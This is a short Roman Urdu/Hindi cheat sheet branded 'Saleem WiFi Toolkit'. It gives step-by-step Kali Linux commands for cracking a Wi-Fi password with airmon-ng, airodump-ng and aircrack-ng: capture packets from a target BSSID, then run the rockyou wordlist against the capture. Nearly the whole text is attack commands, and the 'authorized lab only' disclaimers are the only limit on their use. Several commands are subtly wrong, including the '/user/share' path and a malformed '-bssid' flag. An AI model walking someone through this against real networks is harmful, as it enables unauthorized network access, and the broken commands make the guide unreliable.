亗 SALEEM WIFI TOOLKIT 亗

Wi-Fi Security Commands — Kali Linux

STEP 1 — Check Wireless Interface

Command:

iwconfig

Work: Wireless interface ki information check karta hai.

STEP 2 — Start Monitor Mode

Command:

sudo airmon-ng start wlan0

Work: Wireless adapter par monitor mode start karne ke liye hota hai. Sirf apne authorized lab mein use karein.

STEP 3 — View Wireless Networks

Command:

airodump-ng wlan0mon

Work: Monitor-mode interface se wireless network information observe karta hai.

Stop Process:

Ctrl + C

Work: Running process ko stop karta hai.

STEP 4 — Target-Specific Packet Capture

Original command:

airodump-ng -c enter_your_tirget_channil --bssid enter_your_tirget_BSSID -w capture wlan0mon

Work: Specified channel aur BSSID ke liye wireless packet capture ka command hai. Iska use sirf authorized lab testing mein hona chahiye.

STEP 5 — Wordlist Directory

Original command:

cd /user/share/wordlists

Work: Wordlist directory mein jane ke liye diya gaya command hai.

STEP 6 — Extract Compressed Wordlist

Original command:

sudo gzip -d rockyou.txt.gz

Work: Compressed "rockyou.txt.gz" file ko extract karne ke liye hai.

STEP 7 — Password Audit

Original command:

aircrack-ng -w /user/share/wordlists/rockyou.txt -bssid enter_your_tirget_BSSID capture-01.cap

Work: Capture file aur wordlist ke zariye Wi-Fi password audit karne ka command hai. Isay unauthorized networks par use na karein.

---

亗 SALEEM TOOLKIT 亗
Learn Wi-Fi Security • Practice Legally
